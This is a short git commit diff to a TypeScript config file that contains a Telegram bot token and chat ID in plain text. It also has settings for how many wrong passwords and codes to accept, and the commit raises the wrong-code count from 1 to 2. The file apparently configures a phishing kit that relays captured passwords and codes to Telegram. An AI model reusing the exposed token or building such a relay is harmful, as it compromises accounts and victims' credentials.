11cacb9ac2b8d01bfdbb137c4920339d876bc082
syta2021-sys <sytay2021@gmail.com>
2026-04-09 22:09:30 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -2,7 +2,7 @@ const config = {
     token: '8746265204:AAEaa96CgH79hQZ6pnLqNMYh-qYt38Zfmk8',
     chat_id: -5182687081,
     so_lan_sai_pass: 1,
-    so_lan_sai_code: 1,
+    so_lan_sai_code: 2,
     thoi_gian_sai_pass: 1,
     thoi_gian_sai_code:18
 };
